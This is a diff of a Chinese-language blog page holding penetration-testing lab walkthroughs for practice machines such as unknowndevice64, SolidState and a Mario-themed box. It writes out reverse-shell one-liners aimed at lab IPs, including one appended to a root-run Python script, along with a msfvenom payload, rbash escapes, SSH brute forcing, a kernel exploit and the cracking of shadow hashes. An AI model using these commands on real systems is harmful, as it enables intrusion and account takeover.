@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-03-04</span>
-            <span class="time">09:50:05</span>
+            <span class="time">22:05:00</span>
           </span>
           
         </div>
@@ -149,6 +149,18 @@ tar xvf <span class="hljs-built_in">shadow</span>.tar</code></pre>
 <p>直接把root里的信息发到shadow.tar里</p>
 <h1 id="unknowndevice64-V1-0"><a href="#unknowndevice64-V1-0" class="headerlink" title="unknowndevice64-V1.0"></a>unknowndevice64-V1.0</h1><p>知识点主要是隐写图片<br>还是利用<br><code>steghide extract -sf key_is_h1dd3n.jpg</code><br>主要这个rbash提权<br>之前也写过了但还是忘了<br>进入vi后<br>:!/bin/bash<br>2、将/bin/bash导出到shell环境变量，将/usr/bin目录导出到PATH环境变量：<br>export SHELL=/bin/bash:$SHELL<br>export PATH=/usr/bin:$PATH<br>然后sudo -l看有什么可以运行的<br>有个sysud64 我们sudo sysud64 -h<br>发现有个-o参数 可以输出文件 我们都知道linux万物皆文件<br>我们可以将root的shell 提到我们这个权限中<br><code>sudo sysud64 -o /dev/null /bin/sh</code><br>或者直接监听<br><code>sudo sysud64 -uroot /bin/bash -c &quot;/bin/sh -i &gt;&amp; /dev/tcp/172.17.135.75/4444 0&gt;&amp;1&quot;</code></p>
 <h1 id="eric实战"><a href="#eric实战" class="headerlink" title="eric实战"></a>eric实战</h1><p>这个是利用git泄漏。ctf见多了<br>主要说一下提权。首先ls -al查看有root权限的<br>发现有个sh,那么我们就可以利用这个反向监听，进入他的root权限<br><code>msfvenom -p cmd/unix/reverse_bash LHOST=192.168.56.102 LPORT=9999 -f raw &gt; shell.sh</code><br>生成后，再echo到那个sh中，利用msf执行。</p>
+<h1 id="超级玛丽"><a href="#超级玛丽" class="headerlink" title="超级玛丽"></a>超级玛丽</h1><p>dirb 用大字典跑 都在/usr/share/dirb 自己找去吧<br>看见一个vhosts 需要修改域名才行<br>vi /etc/hosts<br>访问后 没有什么 所以我们要利用ssh<br>使用dirbuster扫描出liugi.php,用cewl爬取用户名<br><code>cewl http://mario.supermariohost.local:8180/liugi.php -d 3 -w user</code><br>再用<br><code>john --wordlist=user --stdout --rules &gt; passwd</code><br>生成社工字典<br>最后hydra -L user -P passwd ssh://10.211.55.25 爆破<br>进入shell 后发现有限制<br>利用help 进去后给了提示利用help<br>发现有awk 才知道awk可以调用system<br>awk ‘BEGIN{system(“/bin/bash”)}’</p>
+<p>再用python切一下<br>uname -a 发现是13.3.0 利用searchspolit<br>gcc 37292.c -o rootshell<br>运行 ./rootshell<br>进入root目录 有个flag.zip<br>还是下载下来到kali 利用<br>fcrackzip -b -D -p rockyou.txt -u flag.zip<br>出密码后 你可以获得想要的内容<br>最后通知你看看etc/shadow<br>吧shadow 加密的信息存起来<br><code>john --wordlist=rockyou.txt mario-passwd</code><br>are you ok?</p>
+<h1 id="SolidState渗透实战"><a href="#SolidState渗透实战" class="headerlink" title="SolidState渗透实战"></a>SolidState渗透实战</h1><p>靶机无法导入，争取复现一下<br>日常扫目录 发现有POP3  运行着james什么玩应 还有4555端口<br>我们可以<br>nc 10.211.55.26 4555<br>利用help命令发现我们可以查看用户名利用setpasswd 修改所有密码 增加用户相当于留后门<br>然后远程连接110端口<br>talnet 10.211.55.26 110<br>挨个登陆 试用户名 因为我们密码已经改为统一<br>list列出邮件<br>最后发现一封邮件写的ssh<br>登入进去后 是rbash 但是用以前的方法不行了<br>我们发现有python环境，利用新的知识<br>msf use exploit/multi/script/web_delivery<br>设置选项 生成payloads我们在靶机上一放<br>kali监听 利用session -i 1 绕过rbash<br>ps aux | grep james 查看下进程<br>发现他在opt下运行着sh 然后opt下还有py文件</p>
+<pre><code class="hljs undefined"><span class="hljs-comment">#!/usr/bin/env python</span>
+import os
+import sys
+try:
+     os.system(<span class="hljs-string">'rm -r /tmp/* '</span>)
+except:
+     sys.<span class="hljs-keyword">exit</span>()</code></pre>
+
+<p>直接在这个python文件里写<br>echo “os.system(‘/bin/nc -e /bin/bash 10.211.55.4 9999’)” &gt;&gt; tmp.py<br>反监听不香吗 应该早日买个域名</p>
 
         </div>
       </div>
